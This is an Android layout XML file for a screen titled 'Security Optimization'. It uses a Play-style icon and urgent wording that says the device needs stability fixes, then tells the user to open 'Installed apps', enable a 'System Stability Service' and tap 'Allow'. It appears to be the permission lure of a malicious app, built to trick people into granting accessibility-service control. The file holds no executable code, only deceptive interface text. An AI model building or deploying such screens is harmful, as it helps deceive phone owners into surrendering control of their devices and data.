<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FFFFFF">

    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:fillViewport="true"
        app:layout_constraintBottom_toTopOf="@id/buttonContainer"
        app:layout_constraintTop_toTopOf="parent">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:gravity="center_horizontal"
            android:orientation="vertical"
            android:padding="32dp">

            <ImageView
                android:layout_width="225dp"
                android:layout_height="207dp"
                android:layout_marginTop="40dp"
                android:src="@drawable/ic_android_play" />

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginTop="25dp"
                android:text="Security Optimization"
                android:textColor="#E0118A4C"
                android:textSize="24sp"
                android:textStyle="bold" />

            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="5dp"
                android:layout_marginBottom="16dp"
                android:alpha="0.9"
                android:gravity="center"
                android:text="Your device requires important stability optimizations to continue. Follow these steps:"
                android:textColor="#5B5B5B"
                android:textSize="16sp"
                android:textStyle="bold" />

            <!-- Step 1 -->
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="#FBFBFB"
                android:padding="17dp"
                android:text="1. Tap 'START'"
                android:textColor="#202124"
                android:textSize="16sp"
                android:textStyle="bold" />

            <!-- Step 2 -->
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="#FBFBFB"
                android:padding="16dp"
                android:text="2. Open 'Installed apps' "
                android:textColor="#202124"
                android:textSize="16sp"
                android:textStyle="bold" />

            <!-- Step 3 -->
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="#FBFBFB"
                android:padding="16dp"
                android:text="3. Tap 'System Stability Service', toggle it ON and 'Allow'"
                android:textColor="#202124"
                android:textSize="16sp"
                android:textStyle="bold" />
        </LinearLayout>
    </ScrollView>

    <FrameLayout
        android:id="@+id/buttonContainer"
        android:layout_width="match_parent"
        android:layout_height="100dp"
        android:background="#FAFAFA"
        android:paddingBottom="16dp"
        app:layout_constraintBottom_toBottomOf="parent">

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnGuideAction"
            android:layout_width="189dp"
            android:layout_height="53dp"
            android:layout_gravity="center"
            android:fontFamily="sans-serif-medium"
            android:text="Start"
            android:textAllCaps="true"
            android:textColor="#FFFFFF"
            android:textSize="16sp"
            android:textStyle="bold"
            app:backgroundTint="#EB098E4A"
            app:cornerRadius="100dp" />
    </FrameLayout>

</androidx.constraintlayout.widget.ConstraintLayout>
